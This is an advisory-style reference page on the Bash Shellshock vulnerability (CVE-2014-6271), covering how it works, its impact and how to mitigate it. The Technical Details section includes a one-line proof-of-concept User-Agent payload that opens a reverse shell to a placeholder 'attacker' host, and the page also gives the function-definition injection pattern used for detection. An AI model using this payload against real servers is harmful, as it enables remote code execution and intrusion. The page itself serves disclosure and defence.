---
title: "CVE-2014-6271 — Bash Shellshock Environment Variable Code Injection"
---

# Bash — Shellshock Environment Variable Code Injection

CVE-2014-6271, known as Shellshock, is a critical vulnerability in the GNU Bash shell disclosed in September 2014. Bash allows function definitions to be exported via environment variables. The flaw causes Bash to execute arbitrary commands appended after a function definition in an environment variable when a new Bash process is spawned. Affected versions include Bash through 4.3. A related bypass (CVE-2014-7169) followed immediately after the initial patch. CVSS score: 10.0 (Critical).

## Technical Details

Bash parses environment variables named in the form `VAR='() { ignored; }; malicious_command'` and executes the trailing code when the variable is imported. Any service or CGI script that invokes a Bash subprocess and passes attacker-controlled data through environment variables is exploitable. Common attack vectors include Apache CGI scripts (via `HTTP_*` environment variables), DHCP client scripts, SSH `ForceCommand` bypass, and Git hooks. A minimal PoC exploit: setting `User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1` against a CGI endpoint executing Bash.

## Impact

CVE-2014-6271 enables pre-authentication remote code execution via any network service that forks Bash subprocesses with environment variables derived from network input. Web servers running CGI scripts were the primary attack surface during mass exploitation. Attackers quickly deployed botnets, worms (including "wopbot"), and DDoS payloads within 24 hours of disclosure. Thousands of servers were compromised before patches were widely applied. Because Bash is ubiquitous on Linux/Unix/macOS systems, attack surface was enormous.

## Mitigation

Upgrade Bash to the patched version for your distribution (e.g., bash-4.3-patch-25 or later). Disable CGI execution where not required. For web applications, consider replacing CGI Bash scripts with FastCGI or other mechanisms that do not fork shell interpreters. WAF rules can detect `() { :;}` patterns in HTTP headers. Detection: grep environment variables and log files for the function-definition pattern.
